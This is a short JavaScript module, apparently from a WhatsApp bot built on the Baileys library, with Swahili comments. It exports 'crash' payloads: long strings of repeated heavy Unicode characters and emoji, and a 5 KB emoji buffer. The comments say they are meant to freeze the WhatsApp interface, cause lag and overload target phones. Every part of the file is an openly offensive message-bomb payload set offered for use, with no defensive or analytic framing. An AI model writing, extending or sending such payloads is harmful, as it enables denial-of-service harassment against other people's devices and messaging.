/**
 * ALLY SCOTT V11 - ALIEN SYSTEM
 * Dark Arsenal Payloads (Risasi za Bot)
 */

const payloads = {
    // Nguvu ya kutosha kulemaza WhatsApp UI kirahisi
    crashPayload: (function() {
        let str = "☣️ *ALLY SCOTT CRASH V11* ☣️\n";
        // Unicode characters nzito kwa ajili ya lag
        let heavy = "҈".repeat(200) + "⡈".repeat(200) + "ᚙ".repeat(200) + "𝀛".repeat(200);
        for (let i = 0; i < 30; i++) {
            str += heavy + "\n";
        }
        return str;
    })(),

    // Payload maalum kwa ajili ya Document crashes
    docPayload: "📂 *SYSTEM OVERLOAD* 📂\n" + "☣️".repeat(5000),

    // Inatumika kulemaza buffer ya simu za target
    overflow: Buffer.alloc(1024 * 5, '👾').toString(),
    
    // Status ya System kwa ajili ya menu
    system_info: {
        version: "V11.0.1 PRO",
        engine: "Baileys/Multi-Device",
        dev: "Ally Scott",
        status: "Alien Protocol Active 👽"
    }
};

module.exports = payloads;
